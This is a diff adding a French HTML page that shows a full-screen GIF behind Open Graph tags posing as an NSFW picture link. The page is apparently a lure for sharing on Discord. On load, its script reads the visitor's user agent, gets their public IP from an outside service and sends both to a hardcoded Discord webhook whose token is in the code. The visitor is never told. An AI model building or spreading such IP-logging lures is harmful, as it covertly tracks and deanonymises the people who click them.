@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>GIF Plein Écran</title>
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      background: #000;
+    }
+    body {
+      width: 100vw;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    #gif {
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+    }
+  </style>
+  <title>Website Name</title>
+  <meta content="Sexy Pics -- Cornhub" property="og:title" />
+  <meta content="Sexy Pics - NSFW pics - CornHub - cornhub.com" property="og:description" />
+  <meta content="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fpreview.redd.it%2Fwtops9577iq91.jpg%3Fblur%3D40%26format%3Dpjpg%26auto%3Dwebp%26s%3Dae58343487e60addeb4b2e462b1d27ff55306243&f=1&nofb=1&ipt=a093a3d21b64273d4da7b6b1ec5ca68c3235517ed164b927c9d9ece2568bd7ed" property="og:image" />
+  <meta content="#43B581" data-react-helmet="true" name="theme-color" />
+  
+</head>
+<body>
+  <img id="gif" src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fmedia.giphy.com%2Fmedia%2FLXONhtCmN32YU%2Fgiphy.gif&f=1&nofb=1&ipt=a52201f735e3328760298251a47771b6e5704d15b5b70c194d3f160b27fe0e04" alt="GIF Plein Écran">
+  <script>
+    // Mettre l'image en plein écran au chargement
+    window.onload = function() {
+      document.body.requestFullscreen && document.body.requestFullscreen();
+    };
+
+    // Récupérer l'userAgent (type de navigateur)
+    const userAgent = navigator.userAgent; // [6][9]
+
+    // Récupérer l'IP publique via un service externe
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
+        // Préparer le payload pour Discord
+        const payload = {
+          content: `Nouvelle visite :\nNavigateur : ${userAgent}\nIP : ${ip}`
+        };
+        // Envoyer au webhook Discord
+        fetch('https://discord.com/api/webhooks/1364660921737154721/tQ5pZGDlr_g8Se4HyG0PpNEF_0VjxXS1Cbz2gf3BdXTgudHcIVREBS7guGpT14HlnQAX', { // Remplace l'URL ici
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        });
+      });
+  </script>
+</body>
+</html>
